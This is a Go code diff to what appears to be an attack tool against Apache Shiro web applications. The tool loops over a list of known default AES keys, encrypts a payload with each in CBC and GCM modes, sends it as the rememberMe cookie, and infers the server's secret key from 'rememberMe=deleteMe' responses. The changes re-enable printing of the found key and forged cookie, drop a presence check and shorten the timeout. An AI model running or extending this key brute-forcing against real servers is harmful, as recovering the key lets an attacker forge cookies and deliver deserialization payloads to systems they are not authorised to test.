@@ -29,7 +29,7 @@ var (
 	interval     int
 )
 
-func httpRequset(RememberMe string) int {
+func httpRequset(RememberMe string, keylen int) int {
 	//设置跳过https证书验证，超时和代理
 	var tr *http.Transport
 	if httpProxy != "" {
@@ -63,7 +63,7 @@ func httpRequset(RememberMe string) int {
 	if err == nil {
 		defer resp.Body.Close()
 	} else {
-		return 1
+		return keylen
 	}
 	//判断rememberMe=deleteMe;是否在响应头中
 	var SetCookieAll string
@@ -74,24 +74,24 @@ func httpRequset(RememberMe string) int {
 		counts := regexp.MustCompile("rememberMe=deleteMe").FindAllStringIndex(SetCookieAll, -1)
 		return len(counts)
 	}
-	return 1
+	return keylen
 }
 
-func findTheKey(key_len int, url string, Shirokeys string, Content []byte) bool {
+func findTheKey(key_len int, url string, Shirokeys string, Content []byte, keylen int) bool {
 
 	key, _ := base64.StdEncoding.DecodeString(Shirokeys)
 	RememberMe1 := aES_CBC_Encrypt(key, Content) //AES CBC加密
 	RememberMe2 := aES_GCM_Encrypt(key, Content) //AES GCM加密
-	if httpRequset(RememberMe1) != key_len {
-		//fmt.Println("[+] Url: ", url)
-		//fmt.Println("[+] CBC-KEY:", Shirokeys)
-		//fmt.Println("[+] rememberMe=", RememberMe1)
+	if httpRequset(RememberMe1, keylen) != key_len {
+		fmt.Println("[+] Url: ", url)
+		fmt.Println("[+] CBC-KEY:", Shirokeys)
+		fmt.Println("[+] rememberMe=", RememberMe1)
 		return true
 	}
-	if httpRequset(RememberMe2) != key_len {
-		//fmt.Println("[+] Url: ", url)
-		//fmt.Println("[+] GCM-KEY:", Shirokeys)
-		//fmt.Println("[+] rememberMe=", RememberMe2)
+	if httpRequset(RememberMe2, keylen) != key_len {
+		fmt.Println("[+] Url: ", url)
+		fmt.Println("[+] GCM-KEY:", Shirokeys)
+		fmt.Println("[+] rememberMe=", RememberMe2)
 		return true
 	}
 	return false
@@ -101,7 +101,7 @@ func getCommandArgs() {
 	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
 	method = "GET"
 	postContent = ""
-	timeout = 10
+	timeout = 5
 	interval = 0
 	httpProxy = ""
 	pointkey = ""
@@ -109,21 +109,13 @@ func getCommandArgs() {
 	serFile = ""
 }
 
-func ShiroCheck() {
-	if httpRequset("wotaifu") != 0 {
-		fmt.Println(" Shiro Exist!")
-	} else {
-		fmt.Println(" Shiro Not Exist!")
-		os.Exit(1)
-	}
-}
 func keyCheck(url string) (key string) {
-	key_len := httpRequset("1")
+	key_len := httpRequset("1", 1)
 	Content, _ := base64.StdEncoding.DecodeString(checkContent)
 	//指定key的检测
 	if pointkey != "" {
 		time.Sleep(time.Duration(interval) * time.Second) //设置请求间隔
-		if !findTheKey(key_len, url, pointkey, Content) {
+		if !findTheKey(key_len, url, pointkey, Content, key_len) {
 			fmt.Println("Key is incorrect!")
 		}
 	} else {
@@ -131,7 +123,7 @@ func keyCheck(url string) (key string) {
 		isFind := false
 		for i := range shirokeys {
 			time.Sleep(time.Duration(interval) * time.Second) //设置请求间隔
-			isFind = findTheKey(key_len, url, shirokeys[i], Content)
+			isFind = findTheKey(key_len, url, shirokeys[i], Content, key_len)
 			if isFind {
 				return shirokeys[i]
 			}
